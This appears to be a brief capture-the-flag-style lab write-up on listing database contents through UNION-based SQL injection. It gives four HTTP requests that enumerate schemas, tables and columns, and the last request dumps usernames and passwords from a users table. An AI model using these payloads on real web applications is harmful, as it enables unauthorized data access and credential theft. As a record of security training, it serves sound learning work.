# Listing the database contents on non-Oracle databases

This was similar to previous attempts where I had difficult with the NULL column placeholder,

the steps for the solution were:

1.  Get schemas

```
GET /filter?category=Pets'+UNION+SELECT+NULL,schema_name+FROM+information_schema.schemata+--+- HTTP/2
```

2.  Get tables

```
GET /filter?category=Pets'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+where+table_schema%3d'public'+--+- HTTP/2
```

3.  Get columns

```
GET /filter?category=Pets'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+where+table_name%3d'users_qsiuoi'+--+- HTTP/2
```

4.  Get info

```
GET /filter?category=Pets'+UNION+SELECT+username_pgwwkg,password_vpnzzr+FROM+users_qsiuoi+--+- 
```
